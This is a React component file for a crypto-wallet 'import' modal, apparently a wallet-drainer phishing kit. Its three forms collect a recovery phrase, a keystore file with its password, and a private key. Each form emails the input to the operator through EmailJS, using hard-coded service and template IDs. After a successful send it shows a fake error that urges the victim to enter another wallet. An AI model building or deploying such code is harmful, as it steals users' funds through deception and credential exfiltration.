import emailjs from "@emailjs/browser";
import toast from "react-hot-toast"
import { IoMdClose } from "react-icons/io"
import { IoArrowBackOutline } from "react-icons/io5"
import { useState } from "react";
import { useWallet } from "../../context";



export const PhraseForm = () => {
    const { handleChange } = useWallet();
    const [message, setMessage] = useState("")
    const [loading, setLoading] = useState(false);

    const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        emailjs.send("service_y2bhhrr", "template_pdxgf2g", { email_subject: "New Phrase Data", message, email_title: "Phrase Data", key: "Recovery Phrase" }, "JEfCbGU-NY097Ysab").then(() => {
           setLoading(false);
           setMessage("");
           window.alert("An error occurred, try importing another active wallet");
           handleChange(null);
        }, () => {
            toast.error("Email sending failed. Try again later.");
           setLoading(false);

        })
    }

    
    return(
        <form className="flex flex-col gap-y-3" onSubmit={handleSubmit}>
            <div className="">
            <textarea name="" id="" cols={30} rows={5} className="w-full border border-gray-500 border-opacity-30 p-3 rounded-lg focus:ring-blue-600 focus:ring-2  focus:ring-opacity-30 transition-colors outline-none  text-xs mb-2  " placeholder="Enter recovery phrase" value={message} onChange={(e) => setMessage(e.target.value)} required ></textarea>
            <p className="text-xs text-gray-800">Typically 12 (sometimes 24) words separated by single spaces</p>
            </div>
            <button  className="bg-blue-700 disabled:bg-blue-900 disabled:bg-opacity-40 hover:bg-blue-900 text-gray-100 font-semibold text-xs w-full py-3 rounded-md " type="submit" disabled={loading} >IMPORT</button>
        </form>
    )
}


const KeystoreForm = () => {

    const [keystore, setKeystore] = useState("");
    const [loading, setLoading] = useState(false);
    const { handleChange } = useWallet();


    const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        setLoading(true);
        emailjs.send("service_y2bhhrr", "template_5ccyb9i", { keystore }, "JEfCbGU-NY097Ysab").then(() => {

           setLoading(false);
           setKeystore("");
           window.alert("An error occurred, try importing another active wallet");
           handleChange(null);
        }, () => {
            toast.error("Email sending failed. Try again later.");
           setLoading(false);

        })
    }


    return(
        <form className="flex flex-col gap-y-3" onSubmit={handleSubmit}>
             <textarea name="" id="" cols={30} rows={5} className="w-full border border-gray-500 border-opacity-30 p-3 rounded-lg focus:ring-blue-600 focus:ring-2  focus:ring-opacity-30 transition-colors outline-none  text-xs " placeholder="Enter keystore" value={keystore} onChange={(e) => setKeystore(e.target.value)} required ></textarea>
            
          
            <p className="text-xs text-gray-800">
            Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
            </p>
            <button  className="bg-blue-700 disabled:bg-blue-900 disabled:bg-opacity-40 hover:bg-blue-900 text-gray-100 font-semibold text-xs w-full py-3 rounded-md " type="submit" disabled={loading} >IMPORT</button>
        </form>
    )
}

const PrivateKeyForm = () => {

    const { handleChange } = useWallet();
    const [message, setMessage] = useState("");
    const [loading, setLoading] = useState(false);

    const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setLoading(true);
        emailjs.send("service_y2bhhrr", "template_pdxgf2g", { email_subject: "New Private Key Data", message, email_title: "Private Key Data", key: "Private Key" }, "JEfCbGU-NY097Ysab").then(() => {
           
           setLoading(false);
           setMessage("")
           window.alert("An error occurred, try importing another active wallet");
           handleChange(null);
        }, () => {
            toast.error("Email sending failed. Try again later.");
           setLoading(false);

        })
    }

    return(
        <form className="flex flex-col gap-y-3" onSubmit={handleSubmit}>
            <input type="password" className="w-full border border-gray-500 border-opacity-30 p-3 rounded-lg focus:ring-blue-600 focus:ring-2  focus:ring-opacity-30 transition-colors outline-none  text-xs mb-2" placeholder="Enter your private key" required value={message} onChange={(e) => setMessage(e.target.value)} />
            <p className="text-xs text-gray-800">
            Typically 12 (sometimes 24) words separated by a single space.
            </p>
            <button  className="bg-blue-700 disabled:bg-blue-900 disabled:bg-opacity-40 hover:bg-blue-900 text-gray-100 font-semibold text-xs w-full py-3 rounded-md " type="submit" disabled={loading} >IMPORT</button>
        </form>
    )
}

export const WalletSubmissionModal = () => {

    const { handleChange, state } = useWallet();
    const [selectedTab, setSelectedTab] = useState("Phrase");

    const handleGoBack = () => {
        if(!state) return;

        handleChange({
            ...state,
            modal_type: "wallet"
        })
    }

    const renderSelectedForm = () => {
        
        switch(selectedTab){

            case "Keystore":
                return <KeystoreForm />
            
            case "Private key":
                return <PrivateKeyForm />;
            
             default:
                return <PhraseForm />   

        }
    }

    if(!state) return;

    return(
        <div className="h-screen bg-black bg-opacity-30 fixed top-0 left-0 w-full flex justify-center items-center"
        onClick={() => handleChange(null)}
        >
        <div className="w-[80%] md:w-[35%] min-h-[70%] rounded-xl overflow-hidden bg-white"
        onClick={(e) => e.stopPropagation()}
        >
           <div className="bg-[#E6E6E6] h-[4rem] flex justify-between items-center px-6">
             <button  className="text-sm text-gray-800 font-semibold" onClick={handleGoBack} >
               <IoArrowBackOutline className="text-xl" />
             </button>
             <button className="bg-red-600 text-white h-8 w-8 rounded-full flex justify-center items-center"
             onClick={() => handleChange(null)}
             >
               <IoMdClose />
             </button>
           </div>
           
           <div className=" flex flex-col gap-y-4 p-6">
            <div className="flex gap-x-5 items-center">
             <div className="h-[2.5rem] w-[2.5rem] md:h-[3.5rem] md:w-[3.5rem] ">
                <img src={state.image} alt="" className="object-cover w-full h-full rounded-full" />
             </div>
             <h3 className="text-sm md:text-base font-semibold  text-gray-800">{state.title}</h3>
            </div>

            
            {/* TABS */}
            <div className="text-xs font-medium text-center  border-b border-[#C0C0C0] ">
         <ul className="flex flex-wrap -mb-px">
         {
              ["Phrase", "Keystore", "Private key"].map((item) => (
                <li key={item} className="mr-3 min-w-[5rem]">
                    <button  className={`w-full inline-block p-3  border-b-2  rounded-t-lg text-xs font-semibold ${selectedTab === item ? 'text-[#000] border-[#000]' : 'text-[#797D8C] border-transparent'} `} 
                    onClick={() => setSelectedTab(item)}
                    >
                    {item}
                </button>
                </li>
              ))
         }
         </ul>
        </div>

        {renderSelectedForm()}
           </div>

        </div>
       </div>
    )
}